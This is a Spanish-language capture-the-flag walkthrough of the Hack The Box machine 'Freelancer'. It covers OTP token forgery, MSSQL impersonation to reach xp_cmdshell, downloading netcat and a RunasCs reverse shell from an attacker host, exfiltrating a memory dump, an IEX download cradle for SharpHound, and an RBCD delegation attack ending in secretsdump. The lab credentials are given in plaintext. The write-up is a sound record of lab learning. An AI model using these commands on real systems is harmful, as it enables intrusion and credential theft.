@@ -1,0 +1,864 @@
+Freelancer - Hard
+
+----------------------------------
+
+Lo primero la máquina dice que puede tardar 2 minutos en ejecutarse el servidor web en el 80
+
+The webserver on Freelancer port 80 can take up to two minutes to start.
+
+Hago escaneos pero no me sale, así que le dejo 10 mimutillos.
+
+Empiezo reiniciando la máquina voy a esperar algo antes de hacer el nmap, si veo que no arranca pues cambio de máquina
+
+Ahora el curl parece que no me da error, voy a empezar
+
+nos sale freelancer.htb y el dominio freelancer.htb0
+
+parece que hay una web en el 80 y el 5985
+
+el 5985 parece ser un puerto de la api, ya veremos más adelante
+
+reviso directorios
+
+Es como un portal de empleo, el blog tiene algun usuario
+
+Crista Watterson19 Jan, 2023, 05:29
+Sara Arkhader10 Feb, 2023, 05:30
+
+tiene formulario de contacto, registro y registro como empleador, el de empleador pone que está inactivo
+
+sudo gobuster dir -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://freelancer.htb -t 50 -b '404,503,502'
+
+Le bajo un poco la caña porque me fallaban queries
+
+/about                (Status: 301) [Size: 0] [--> /about/]
+/contact              (Status: 301) [Size: 0] [--> /contact/]
+/blog                 (Status: 301) [Size: 0] [--> /blog/]
+/admin                (Status: 301) [Size: 0] [--> /admin/]
+
+Es interesante admin, no parece que salga demasiada cosa
+
+hago cuentas, con user entras normal con employeer se necesita activar
+
+http://freelancer.htb/accounts/profile/
+
+puedo subir archivos pero después de trastear no parece muy explotable
+
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/login                (Status: 301) [Size: 0] [--> /accounts/login/]
+/recovery             (Status: 301) [Size: 0] [--> /accounts/recovery/]
+
+el enlace recovery parece interesante
+
+tambien desde el menú se ve delete y reset_security_questions
+
+Finalmente nos podemos activar la cuenta de empleador si reseteamos el pass
+al entrar tenemos 3 cosas nuevas post jobs, list jobs y qr code
+
+El QR nos da un enlace para logear automatico
+http://freelancer.htb/accounts/login/otp/****/
+
+ese código tiene 2 partes, en el cyberchef si lo cambiamos desde base64 nos sale algo así
+10011ý¶·Î[ó·Ñ®[ñíÛÞy½µw=
+
+la primera parte se corresponde antes del = del código
+
+modifico un poco y obtengo 
+Invalid or expired OTP Token
+
+Vale tocando un poco cambio la primera parte por 1 y obtengo
+MQ==
+Invalid user primary key!
+
+Pruebo con el 2 que sería
+Mg==
+
+y me logea como admin
+
+johnHalond@freelancer.htb
+
+tenemos una credencial
+
+si entramos a /admin podemos ver más usuarios
+
+    mark.rose@yahoo.com
+	johnholand@secretareas.com
+	jroman1992@gmail.com
+	philippos007@hacktheworld.eu
+	itachi.uchiha@gmail.com
+	maya001@hotmail.com
+	SaraArkhader@gmail.com
+	lisa.Arkhader@outlook.com
+	Camellia@athento.com
+	crista.Watterson@gmail.com
+	martin.rose@hotmail.com
+	tomHazard@freelancer.htb
+	johnHalond@freelancer.htb
+
+en principio 2 usuarios en htb
+
+    Camellia@athento.com
+	crista.Watterson@gmail.com
+	martin.rose@hotmail.com
+	tomHazard@freelancer.htb
+	johnHalond@freelancer.htb
+
+Tenemos una consola sql
+
+Select Database();
+
+('42000', "[42000] [Microsoft][ODBC Driver 17 for SQL Server][SQL Server]Incorrect syntax near the keyword 'DATABASE'. (156) (SQLExecDirectW)")
+
+Select DB_NAME();
+Freelancer_webapp_DB
+
+SELECT TABLE_NAME
+FROM INFORMATION_SCHEMA.TABLES
+WHERE TABLE_TYPE = 'BASE TABLE';
+
+TABLE_NAME
+django_migrations
+freelancer_customuser
+freelancer_article
+freelancer_job
+freelancer_otptoken
+freelancer_employer
+freelancer_freelancer
+freelancer_comment
+freelancer_job_request
+django_content_type
+django_admin_log
+auth_permission
+auth_group
+auth_group_permissions
+django_session
+
+https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#impersonation-of-other-users
+
+esto en teoría aplicaría
+
+EXECUTE AS LOGIN = 'sa'
+SELECT SYSTEM_USER
+SELECT IS_SRVROLEMEMBER('sysadmin')
+
+Como sysadmin se puede suplantar a cualquier otro
+
+podemos probar tambien si funciona xp_cmdshell
+no nos deja
+
+SELECT SYSTEM_USER;
+
+Freelancer_webapp_user
+
+// Con esto aplicamos lo de arriba para añadir a nuestro usuario al rol de sysadmin
+EXECUTE AS LOGIN = 'SA'
+EXEC sp_addsrvrolemember 'Freelancer_webapp_user', 'sysadmin'
+-----
+
+SELECT 
+    sp.name AS LoginName,
+    spr.name AS RoleName
+FROM 
+    sys.server_role_members srm
+JOIN 
+    sys.server_principals sp ON srm.member_principal_id = sp.principal_id
+JOIN 
+    sys.server_principals spr ON srm.role_principal_id = spr.principal_id
+WHERE 
+    sp.name = 'Freelancer_webapp_user';
+
+LoginName	RoleName
+Freelancer_webapp_user	sysadmin
+
+----
+
+bueno ya somos sysadmin en la base de datos
+
+xp_cmdshell 'echo IWR http://10.10.x.x:4433/nc.exe -OutFile %TEMP%\nc.exe | powershell -noprofile'
+
+SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online. (15281) (SQLExecDirectW)")
+
+EXEC sp_addsrvrolemember 'sa', 'sysadmin';
+EXEC xp_cmdshell 'dir C:\';
+
+Me falla
+
+----
+
+SELECT 
+    dp.name AS UserName,
+    dp.type_desc AS UserType,
+    r.name AS RoleName
+FROM 
+    sys.database_principals dp
+LEFT JOIN 
+    sys.database_role_members drm ON dp.principal_id = drm.member_principal_id
+LEFT JOIN 
+    sys.database_principals r ON r.principal_id = drm.role_principal_id
+WHERE 
+    dp.name = USER_NAME();
+
+UserName	UserType	RoleName
+dbo	SQL_USER	db_owner
+
+---
+
+Comprobamos que puede pasar
+
+EXEC sp_configure;
+
+name	minimum	maximum	config_value	run_value
+access check cache bucket count	0	65536	0	0
+access check cache quota	0	2147483647	0	0
+Ad Hoc Distributed Queries	0	1	0	0
+ADR cleaner retry timeout (min)	0	32767	0	0
+ADR Preallocation Factor	0	32767	0	0
+affinity I/O mask	-2147483648	2147483647	0	0
+affinity mask	-2147483648	2147483647	0	0
+affinity64 I/O mask	-2147483648	2147483647	0	0
+affinity64 mask	-2147483648	2147483647	0	0
+Agent XPs	0	1	0	0
+allow filesystem enumeration	0	1	1	1
+allow polybase export	0	1	0	0
+allow updates	0	1	0	0
+automatic soft-NUMA disabled	0	1	0	0
+backup checksum default	0	1	0	0
+blocked process threshold (s)	0	86400	0	0
+c2 audit mode	0	1	0	0
+clr enabled	0	1	0	0
+clr strict security	0	1	1	1
+column encryption enclave type	0	2	0	0
+contained database authentication	0	1	0	0
+cost threshold for parallelism	0	32767	5	5
+cross db ownership chaining	0	1	0	0
+cursor threshold	-1	2147483647	-1	-1
+Database Mail XPs	0	1	0	0
+default full-text language	0	2147483647	1033	1033
+default language	0	9999	0	0
+default trace enabled	0	1	1	1
+disallow results from triggers	0	1	0	0
+external scripts enabled	0	1	0	0
+filestream access level	0	2	0	0
+fill factor (%)	0	100	0	0
+ft crawl bandwidth (max)	0	32767	100	100
+ft crawl bandwidth (min)	0	32767	0	0
+ft notify bandwidth (max)	0	32767	100	100
+ft notify bandwidth (min)	0	32767	0	0
+hadoop connectivity	0	7	0	0
+index create memory (KB)	704	2147483647	0	0
+in-doubt xact resolution	0	2	0	0
+lightweight pooling	0	1	0	0
+locks	5000	2147483647	0	0
+max degree of parallelism	0	32767	0	0
+max full-text crawl range	0	256	4	4
+max server memory (MB)	128	2147483647	2147483647	2147483647
+max text repl size (B)	-1	2147483647	65536	65536
+max worker threads	128	65535	0	0
+media retention	0	365	0	0
+min memory per query (KB)	512	2147483647	1024	1024
+min server memory (MB)	0	2147483647	0	16
+nested triggers	0	1	1	1
+network packet size (B)	512	32767	4096	4096
+Ole Automation Procedures	0	1	0	0
+open objects	0	2147483647	0	0
+optimize for ad hoc workloads	0	1	0	0
+PH timeout (s)	1	3600	60	60
+polybase enabled	0	1	0	0
+polybase network encryption	0	1	1	1
+precompute rank	0	1	0	0
+priority boost	0	1	0	0
+query governor cost limit	0	2147483647	0	0
+query wait (s)	-1	2147483647	-1	-1
+recovery interval (min)	0	32767	0	0
+remote access	0	1	1	1
+remote admin connections	0	1	0	0
+remote data archive	0	1	0	0
+remote login timeout (s)	0	2147483647	10	10
+remote proc trans	0	1	0	0
+remote query timeout (s)	0	2147483647	600	600
+Replication XPs	0	1	0	0
+scan for startup procs	0	1	0	0
+server trigger recursion	0	1	1	1
+set working set size	0	1	0	0
+show advanced options	0	1	1	1
+SMO and DMO XPs	0	1	1	1
+transform noise words	0	1	0	0
+two digit year cutoff	1753	9999	2049	2049
+user connections	0	32767	0	0
+user instance timeout	5	65535	60	60
+user instances enabled	0	1	0	0
+user options	0	32767	0	0
+xp_cmdshell	0	1	1	1
+
+-------------------
+
+EXECUTE AS LOGIN = 'sa';
+
+EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+
+EXEC sp_configure 'xp_cmdshell'; ---> devuelve run 1
+así que en principio funciona, si no funciona es que algo lo bloquea
+
+voy a probar de nuevo a descargarme el nc
+
+-------------
+
+xp_cmdshell 'echo IWR http://10.10.x.x:4433/nc.exe -OutFile %TEMP%\nc.exe | powershell -noprofile'
+
+--> Nos descarga el archivo por fin
+
+EXEC xp_cmdshell 'powershell -noprofile -command "$env:TEMP\nc.exe 10.10.x.x 4455"';
+
+Nos falla por el AV
+
+----------
+
+EXEC xp_cmdshell 'dir C:\Users';
+Administrator
+lkazanof
+lorra199
+mikasaAckerman
+MSSQLSERVER
+Public
+sqlbackupoperator
+sql_svc
+
+--------
+
+Reviso un poco los directorios, viendo por un poco de ayuda encuentro que quizas con otro nc va
+
+https://packetstormsecurity.com/files/31140/nc.exe.html
+
+pruevo con rev.ps1, de vez en cuando se quita la config y tengo que volver a configurar
+EXECUTE AS LOGIN = 'sa';
+EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+
+Pruebo varias cosas pero el antivirus da por saco
+
+EXEC xp_cmdshell 'powershell -Command "Get-MpPreference | Select-Object DisableRealtimeMonitoring"';
+Si sale true está desactivado
+EXEC xp_cmdshell 'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"';
+Set-MpPreference : You don't have enough permissions to perform the requested operation.
+At line:1 char:1
++ Set-MpPreference -DisableRealtimeMonitoring $true
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
++ CategoryInfo : PermissionDenied: (MSFT_MpPreference:root\Microsoft\...FT_MpPreference) [Set-MpPreferenc 
+
+EXEC xp_cmdshell 'powershell -Command "Start-Process powershell -ArgumentList \'-NoProfile -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\"\' -Verb RunAs"';
+
+xp_cmdshell 'dir C:\Users\sql_svc\Downloads\SQLEXPR-2019_x64_ENU'
+xp_cmdshell 'type C:\Users\sql_svc\Downloads\SQLEXPR-2019_x64_ENU\sql-Configuration.INI'
+
+[OPTIONS]
+INSTANCEID="SQLEXPRESS"
+RSSVCACCOUNT="NT Service\ReportServer$SQLEXPRESS"
+AGTSVCACCOUNT="NT AUTHORITY\NETWORK SERVICE"
+SQLSVCACCOUNT="FREELANCER\sql_svc"
+SQLSVCPASSWORD="IL0v3ErenY3ager"
+SQLSYSADMINACCOUNTS="FREELANCER\Administrator"
+SECURITYMODE="SQL"
+SAPWD="t3mp0r@ryS@PWD"
+
+Bueno por suerte buscando en los directorios tenemos un par de pass y podemos probar a conectarnos
+
+
+crackmapexec smb 10.129.x.x -u users -p pass
+SMB         10.129.x.x   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:freelancer.htb) (signing:True) (SMBv1:False)
+SMB         10.129.x.x   445    DC               [-] freelancer.htb\Administrator:IL0v3ErenY3ager STATUS_LOGON_FAILURE
+SMB         10.129.x.x   445    DC               [-] freelancer.htb\lkazanof:IL0v3ErenY3ager STATUS_LOGON_FAILURE
+SMB         10.129.x.x   445    DC               [-] freelancer.htb\lorra199:IL0v3ErenY3ager STATUS_LOGON_FAILURE
+SMB         10.129.x.x   445    DC               [+] freelancer.htb\mikasaAckerman:IL0v3ErenY3ager
+
+pruebo continue on success pero no hay mas
+
+Aquí bajandonos 
+https://github.com/antonioCoco/RunasCs/releases/tag/v1.5
+
+podemos ejecutar un proceso con otro usuario para hacernos el reverse shell, y no lo impide el AV
+
+xp_cmdshell 'echo IWR http://10.10.x.x:4433/rcs.exe -OutFile c:\temp\rcs.exe | powershell -noprofile'
+EXEC xp_cmdshell 'powershell -noprofile -command "c:\temp\rcs.exe mikasaAckerman IL0v3ErenY3ager powershell -r 10.10.x.x:4455"';
+
+PS C:\users\mikasaAckerman\Desktop> dir
+dir
+
+
+    Directory: C:\users\mikasaAckerman\Desktop
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+-a----       10/28/2023   6:23 PM           1468 mail.txt                                                              
+-a----        10/4/2023   1:47 PM      292692678 MEMORY.7z                                                             
+-ar---        7/25/2024   7:51 PM             34 user.txt                                                              
+
+
+PS C:\users\mikasaAckerman\Desktop> cat user.txt
+cat user.txt
+
+
+--- 
+
+Y tenemos la bandera de usuario
+
+cat mail.txt
+Hello Mikasa,
+I tried once again to work with Liza Kazanoff after seeking her help to troubleshoot the BSOD issue on the "DATACENTER-2019" computer. As you know, the problem started occurring after we installed the new update of SQL Server 2019.
+I attempted the solutions you provided in your last email, but unfortunately, there was no improvement. Whenever we try to establish a remote SQL connection to the installed instance, the server's CPU starts overheating, and the RAM usage keeps increasing until the BSOD appears, forcing the server to restart.
+Nevertheless, Liza has requested me to generate a full memory dump on the Datacenter and send it to you for further assistance in troubleshooting the issue.
+Best regards,
+
+netstat -ano | Select-String "LISTENING"
+
+  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       2800
+  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       632
+  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       972
+  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       632
+  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING       632
+  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING       972
+  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING       632
+  TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING       632
+  TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING       632
+  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING       2992
+  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       480
+  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       344
+  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1312
+  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       632
+  TCP    0.0.0.0:49671          0.0.0.0:0              LISTENING       1464
+  TCP    0.0.0.0:49680          0.0.0.0:0              LISTENING       632
+  TCP    0.0.0.0:49681          0.0.0.0:0              LISTENING       632
+  TCP    0.0.0.0:49682          0.0.0.0:0              LISTENING       632
+  TCP    0.0.0.0:49687          0.0.0.0:0              LISTENING       620
+  TCP    0.0.0.0:54626          0.0.0.0:0              LISTENING       3580
+  TCP    0.0.0.0:54630          0.0.0.0:0              LISTENING       3188
+  TCP    0.0.0.0:55297          0.0.0.0:0              LISTENING       4584
+  TCP    10.129.x.x:53          0.0.0.0:0              LISTENING       3580
+  TCP    10.129.x.x:139         0.0.0.0:0              LISTENING       4
+  TCP    127.0.0.1:53           0.0.0.0:0              LISTENING       3580
+  TCP    127.0.0.1:8000         0.0.0.0:0              LISTENING       4972
+  TCP    [::]:88                [::]:0                 LISTENING       632
+  TCP    [::]:135               [::]:0                 LISTENING       972
+  TCP    [::]:445               [::]:0                 LISTENING       4
+  TCP    [::]:464               [::]:0                 LISTENING       632
+  TCP    [::]:593               [::]:0                 LISTENING       972
+  TCP    [::]:5985              [::]:0                 LISTENING       4
+  TCP    [::]:9389              [::]:0                 LISTENING       2992
+  TCP    [::]:47001             [::]:0                 LISTENING       4
+  TCP    [::]:49664             [::]:0                 LISTENING       480
+  TCP    [::]:49665             [::]:0                 LISTENING       344
+  TCP    [::]:49666             [::]:0                 LISTENING       1312
+  TCP    [::]:49667             [::]:0                 LISTENING       632
+  TCP    [::]:49671             [::]:0                 LISTENING       1464
+  TCP    [::]:49680             [::]:0                 LISTENING       632
+  TCP    [::]:49681             [::]:0                 LISTENING       632
+  TCP    [::]:49682             [::]:0                 LISTENING       632
+  TCP    [::]:49687             [::]:0                 LISTENING       620
+  TCP    [::]:54626             [::]:0                 LISTENING       3580
+  TCP    [::]:54630             [::]:0                 LISTENING       3188
+  TCP    [::]:55297             [::]:0                 LISTENING       4584
+  TCP    [::1]:53               [::]:0                 LISTENING       3580
+
+parece que hay algo en el 8000
+
+me traigo el archivo
+curl -F "file=@MEMORY.7z" http://10.10.x.x:4433/upload
+
+como es powershell uso este comando
+Invoke-WebRequest -Uri http://10.10.x.x:4433/upload.7z -Method Post -InFile MEMORY.7z
+
+Tarda algo de tiempo y mi script no es muy bueno, así que simplemente espero
+
+Aún estoy intentando bajarme el 7z que me tarda, probé con smb pero va lento también
+
+mientras
+bloodhound-python -u mikasaAckerman -p IL0v3ErenY3ager -d freelancer.htb -ns 10.129.x.x -c all
+
+finalmente por politicas lanzo el servidor smb
+sudo impacket-smbserver -smb2support share . -user user -password password
+
+net use \\10.10.x.x\share /user:user password
+Copy-Item -Path "MEMORY.7z" -Destination "\\10.10.x.x\share\MEMORY.7z"
+Dejo copiando
+
+net use \\10.10.x.x\share /delete --> para desconectar la unidad al final
+
+7z x MEMORY.7z
+
+nos genera 1 archivo de 1.7 GB del dmp de los procesos del sistema
+
+bueno y aquí empiezo a instalar el wine para ver si lo puedo hacer en linux y evitar problemas del AV
+
+OK vale hay un ejecutable en win32 y otro en x64, evidentemente sin tanto problema ejecuto wine mimikatz.exe de x64
+y va perfect
+
+sekurlsa::minidump /home/path/MEMORY.DMP
+sekurlsa::logonPasswords 
+Opening : '/home/pathMEMORY.DMP' file for minidump...
+ERROR kuhl_m_sekurlsa_acquireLSA ; Memory opening
+0024:err:heap:validate_used_block heap 0000000000240000, block 000000000025CBF8: invalid block header
+7z h MEMORY.7z
+7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
+p7zip Version 16.02 (locale=es_ES.UTF-8,Utf16=on,HugeFiles=on,64 bits,128 CPUs AMD Ryzen 9 7845HX with Radeon Graphics         (A60F12),ASM,AES-NI)
+Scanning
+1 file, 292692678 bytes (280 MiB)
+
+CRC32             Size  Name
+-------- -------------  ------------
+870FA054     292692678  MEMORY.7z
+-------- -------------  ------------
+870FA054     292692678  
+Size: 292692678
+CRC32  for data:              870FA054
+Everything is Ok
+
+-----
+
+Al final me acabo trayendo el archivo al windows real y lo hago desde ahí puede ser fallo del wine
+
+Volví linux y probé rekall tuve problemas acabé por configurar volatility3 para leer los procesos del DMP
+
+Tras mucho configurar
+Básicamente hice un venv, instalé volatility3
+Me descargué los archivos de windows
+
+https://github.com/volatilityfoundation/volatility3?tab=readme-ov-file
+----
+Symbol Tables
+Symbol table packs for the various operating systems are available for download at:
+
+https://downloads.volatilityfoundation.org/volatility3/symbols/windows.zip
+https://downloads.volatilityfoundation.org/volatility3/symbols/mac.zip
+https://downloads.volatilityfoundation.org/volatility3/symbols/linux.zip
+----
+
+y finalmente tras varios intentos pues arraqué el programa así
+vol -f /home/xxx/freelancer/content/MEMORY.DMP --symbol-dir /home/xxx/venv/windows windows.info.Info
+
+tengo que instalar yara y crypto
+vol -f /home/xx/MEMORY.DMP -s /home/xx/venv/windows -vv windows.pslist.PsList
+
+Despues de muchas vueltas uso windbg
+Mucho mejor el windbg, quizás al acabar la máquina me ponga a ver si arreglo lo de los simbolos porque veo que me baja otros distintos
+
+!process 0 0 --> sale mucha info
+
+!process 0 0 | findstr lsass -> buscamos lsass.exe para hacer el dump de los pass
+
+no funciona por lo cual salgo todo a un output
+PROCESS ffffbc83a93e7080
+    SessionId: 0  Cid: 0248    Peb: c4fb6df000  ParentCid: 01c8
+    DirBase: 0cfd2002  ObjectTable: ffffd3067d89ab00  HandleCount: 1051.
+    Image: lsass.exe
+
+!dumpheap -type "lsass.exe"
+1: kd> .process /r /p ffffbc83a93e7080
+Implicit process is now ffffbc83`a93e7080
+Loading User Symbols
+................................................................
+...................
+---
+salta algun error pero funciona
+
+.dump /f C:\temp\shared\mimi\lsass_dump.dmp
+
+mimikatz # privilege::debug
+ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061
+mimikatz # sekurlsa::minidump lsass_dump.dmp
+Switch to MINIDUMP : 'lsass_dump.dmp'
+mimikatz # sekurlsa::logonpasswords
+Opening : 'lsass_dump.dmp' file for minidump...
+ERROR kuhl_m_sekurlsa_acquireLSA ; Memory opening
+
+----
+
+Lamentablemente falla, tengo cierta ayuda que me dice que siga por este lado por eso sigo
+vol -f lsass_dump.dmp --symbol-dir /home/s4ints/venv/windows windows.lsadump.Lsadump
+lo llevo el dmp a volatility3 de nuevo
+
+pruebo de nuevo en windbg
+ffffbc83a93e7080
+
+PROCESS ffffbc83a93e7080
+    SessionId: 0  Cid: 0248    Peb: c4fb6df000  ParentCid: 01c8
+    DirBase: 0cfd2002  ObjectTable: ffffd3067d89ab00  HandleCount: 1051.
+    Image: lsass.exe
+    VadRoot ffffbc83a7dfcbf0 Vads 147 Clone 0 Private 1209. Modified 149. Locked 6.
+    DeviceMap ffffd30679c137e0
+    Token                             ffffd3067b347060
+    ElapsedTime                       00:02:55.158
+    UserTime                          00:00:00.015
+    KernelTime                        00:00:00.015
+    QuotaPoolUsage[PagedPool]         127808
+    QuotaPoolUsage[NonPagedPool]      32400
+    Working Set Sizes (now,min,max)  (4307, 50, 345) (17228KB, 200KB, 1380KB)
+    PeakWorkingSetSize                4266
+    VirtualSize                       2101334 Mb
+    PeakVirtualSize                   2101336 Mb
+    PageFaultCount                    5528
+    MemoryPriority                    BACKGROUND
+    BasePriority                      9
+    CommitCharge                      1419
+
+!memusage
+--------  4772      0     0 ----- -----   328  process ( lsass.exe ) ffffbc83a93e7080
+--------  5712      0     0 ----- -----   448  process ( svchost.exe ) ffffbc83a943c080
+
+.writemem c:\temp\memory_dump.bin ffffbc83a93e7080 L1000
+
+!process ffffbc83a93e7080
+PROCESS ffffbc83a93e7080
+    SessionId: 0  Cid: 0248    Peb: c4fb6df000  ParentCid: 01c8
+    DirBase: 0cfd2002  ObjectTable: ffffd3067d89ab00  HandleCount: 1051.
+    Image: lsass.exe
+!address
+
+1: kd> .dump /m C:\temp\shared\ls4.dmp
+Creating C:\temp\shared\ls4.dmp - mini kernel dump
+KdDebuggerData.MmMaximumNonPagedPoolInBytes is NULL
+KdDebuggerData.MmAllocatedNonPagedPool is NULL
+KdDebuggerData.MmTotalCommittedPages is NULL
+KdDebuggerData.MmPeakCommitment is NULL
+KdDebuggerData.MmTotalCommitLimitMaximum is NULL
+Page 2000428cd too large to be in the dump file.
+Page 200012c66 too large to be in the dump file.
+Page 2000428cd too large to be in the dump file.
+Page 200012c66 too large to be in the dump file.
+Dump successfully written
+
+mimikatz # sekurlsa::logonPasswords full
+Opening : 'ls4.dmp' file for minidump...
+ERROR kuhl_m_sekurlsa_acquireLSA ; Memory opening
+
+También pruebo en windows y linux con pypykatz pero nada no consigo extraer bien la información
+pypykatz lsa minidump MEMORY.DMP
+INFO:pypykatz:Parsing file MEMORY.DMP
+ERROR:pypykatz:Minidump parsing error!
+con ls4 lo mismo, seguramente extraigo mal la información del dmp
+
+.symfix
+.reload /f
+.process /r /p ffffbc83a93e7080
+    Implicit process is now ffffbc83`a93e7080
+    Loading User Symbols
+!thread
+    THREAD ffffbc83ab0da080  Cid 0f08.0f14  Teb: 00000002b1e13000 Win32Thread: ffffbc83ab01a610 RUNNING on processor 1
+    IRP List:
+        ffffbc83aa90fd60: (0006,0118) Flags: 00060000  Mdl: 00000000
+    Not impersonating
+    DeviceMap                 ffffd3067b186900
+    Owning Process            ffffbc83aaa66080       Image:         notmyfault64.exe
+
+.dump C:\temp\shared\mimi\ls1.dmp
+
+pypykatz lsa minidump ls1.dmp
+INFO:pypykatz:Parsing file ls1.dmp
+ERROR:pypykatz:Minidump parsing error!
+
+Otra vez parse error
+
+pruebo por ultima vez el notmyfault de threads
+!process ffffbc83aaa66080
+
+Llegado este momento me hechan una mano y continuo como si consiguiese las credenciales de lorra
+No consigo sacar el proceso en cuestion del dmp
+
+lorra199:PWN3D#l0rr@Armessa199
+---------------------------------------
+La idea inicial era algo similar a esto
+https://www.onlinehashcrack.com/how-to-procdump-mimikatz-credentials.php
+
+El tema es que tengo el dump completo, pero no logro extraer solo la información de eso, lo dejo para más adelante
+---------------------
+
+evil-winrm -i 10.129.x.x -u lorra199 -p PWN3D#l0rr@Armessa199
+
+Aliases for \\DC
+
+-------------------------------------------------------------------------------
+*Access Control Assistance Operators
+*Account Operators
+*Administrators
+*Allowed RODC Password Replication Group
+*Backup Operators
+*Cert Publishers
+*Certificate Service DCOM Access
+*Cryptographic Operators
+*Denied RODC Password Replication Group
+*Distributed COM Users
+*DnsAdmins
+*Event Log Readers
+*Guests
+*Hyper-V Administrators
+*IIS_IUSRS
+*Incoming Forest Trust Builders
+*Network Configuration Operators
+*Performance Log Users
+*Performance Monitor Users
+*Pre-Windows 2000 Compatible Access
+*Print Operators
+*RAS and IAS Servers
+*RDS Endpoint Servers
+*RDS Management Servers
+*RDS Remote Access Servers
+*Remote Desktop Users
+*Remote Management Users
+*Replicator
+*Server Operators
+*SQLServer2005SQLBrowserUser$DC
+*Storage Replica Administrators
+*Terminal Server License Servers
+*Users
+*Windows Authorization Access Group
+The command completed successfully.
+
+
+Group Accounts for \\
+
+-------------------------------------------------------------------------------
+*AD Recycle Bin
+*Cloneable Domain Controllers
+*DnsUpdateProxy
+*Domain Admins
+*Domain Computers
+*Domain Controllers
+*Domain Guests
+*Domain Users
+*Enterprise Admins
+*Enterprise Key Admins
+*Enterprise Read-only Domain Controllers
+*Group Policy Creator Owners
+*Key Admins
+*Protected Users
+*Read-only Domain Controllers
+*Schema Admins
+The command completed with one or more errors.
+
+net group "Domain Admins" /domain
+Group name     Domain Admins
+Comment        Designated administrators of the domain
+
+Members
+
+-------------------------------------------------------------------------------
+Administrator
+The command completed successfully.
+
+------
+no conseguimos gran cosa, sencillamente necesitamos ser Administrator
+
+Invoke-WebRequest -Uri http://10.10.x.x:4433/SharpHound.exe -OutFile C:\temp\SharpHound.exe
+
+c:\temp\SharpHound.exe -c All -d freelancer.htb --ZipFileName output.zip
+
+Aprovechando que tengo abierto el smb
+
+Copy-Item -Path "c:\temp\20240726172739_output.zip" -Destination "\\10.10.x.x\share\output.zip"
+
+Bueno tengo la versión del bloodhound mayor de la que soporta el sh, asi que me bajo el ps1
+
+powershell -exec bypass -c "IEX (iwr -UseBasicParsing 'http://10.10.x.x:4433/sh.ps1'); Invoke-Bloodhound -CollectionMethod All -Domain freelancer.htb -OutputDirectory C:\temp\ -ZipFileName out.zip"
+
+Copy-Item -Path "c:\temp\20240726174844_out.zip" -Destination "\\10.10.x.x\share\out.zip"
+
+Vale fallo mio de nuevo, porque me descargué una version antigua de inet voy a probar con la que viene
+cp /usr/lib/bloodhound/resources/app/Collectors/SharpHound.ps1 sh.ps1
+
+powershell -exec bypass -c "IEX (iwr -UseBasicParsing 'http://10.10.x.x:4433/sh.ps1'); Invoke-Bloodhound -CollectionMethod All -Domain freelancer.htb -OutputDirectory C:\temp\ -ZipFileName out.zip"
+net use \\10.10.x.x\share /user:user password --> en caso de no estar montado
+Copy-Item -Path "c:\temp\20240726175459_out.zip" -Destination "\\10.10.x.x\share\out.zip"
+
+Básicamente lo que encuentro es que hay archivos en la papelera con la cuenta lorra
+
+sacamos un password Summer2018!
+
+addcomputer.py -computer-name 'yo' -computer-pass '1234' -dc-host freelancer.htb -domain-netbios freelancer.htb freelancer.htb/lorra199:'PWN3D#l0rr@Armessa199'
+Impacket v0.12.0.dev1+20230909.154612.3beeda7 - Copyright 2023 Fortra
+
+[*] Successfully added machine account yo$ with password 1234.
+
+impacket-rbcd -delegate-from 'yo$' -delegate-to 'DC$' -dc-ip 10.129.x.x -action 'write' 'freelancer.htb/lorra199:PWN3D#l0rr@Armessa199'
+Impacket v0.12.0.dev1+20230909.154612.3beeda7 - Copyright 2023 Fortra
+
+[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
+[*] Delegation rights modified successfully!
+[*] yo$ can now impersonate users on DC$ via S4U2Proxy
+[*] Accounts allowed to act on behalf of other identity:
+[*]     yo$          (S-1-5-21-3542429192-2036945976-3483670807-12102)
+
+getST.py -spn 'cifs/DC.freelancer.htb' -impersonate Administrator -dc-ip 10.129.x.x 'freelancer.htb/yo$:1234'
+Impacket v0.12.0.dev1+20230909.154612.3beeda7 - Copyright 2023 Fortra
+
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating Administrator
+[*] 	Requesting S4U2self
+[*] 	Requesting S4U2Proxy
+[*] Saving ticket in Administrator.ccache
+
+secretsdump.py 'freelancer.htb/Administrator@DC.freelancer.htb' -k -no-pass -dc-ip 10.129.x.x -target-ip 10.129.x.x -just-dc-ntlm
